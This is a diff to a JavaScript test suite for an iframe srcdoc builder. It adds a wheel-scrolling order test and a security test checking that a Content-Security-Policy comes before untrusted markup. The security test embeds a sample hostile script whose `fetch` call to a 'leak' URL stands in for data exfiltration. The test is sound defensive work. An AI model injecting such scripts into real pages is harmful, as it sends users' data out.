@@ -25,6 +25,14 @@ describe("htmlCompanionSrcdoc", () => {
 		expect(out).toContain('console.log("app")');
 	});
 
+	it("installs wheel scrolling before the app module", () => {
+		const wheelAdapterAt = out.indexOf("ryuInstallHorizontalWheelScrolling");
+		const appScriptAt = out.indexOf('console.log("app")');
+
+		expect(wheelAdapterAt).toBeGreaterThanOrEqual(0);
+		expect(wheelAdapterAt).toBeLessThan(appScriptAt);
+	});
+
 	it("injects the bridge bootstrap and mount context into the frame", () => {
 		expect(out).toContain("window.ryu = ryu");
 		expect(out).toContain("tokenTable");
@@ -86,6 +94,16 @@ describe("htmlCompanionSrcdoc", () => {
 		expect(res.indexOf("Content-Security-Policy")).toBeLessThan(
 			res.indexOf('id="ryu-plugin-root"')
 		);
+	});
+
+	it("locks the document before a hostile pre-head script", () => {
+		const marker = "HOSTILE_PRE_HEAD_SCRIPT";
+		const hostile = `<!doctype html><script>${marker};fetch("https://example.com/leak")</script><html><head></head><body></body></html>`;
+		const res = htmlCompanionSrcdoc(NONCE, hostile, PLUGIN_ID);
+		const hostileAt = res.indexOf(marker);
+
+		expect(res.indexOf("Content-Security-Policy")).toBeLessThan(hostileAt);
+		expect(res.indexOf("ryu-plugin-ready")).toBeLessThan(hostileAt);
 	});
 
 	it("escapes </script> and separators in the mount context (no tag breakout)", () => {
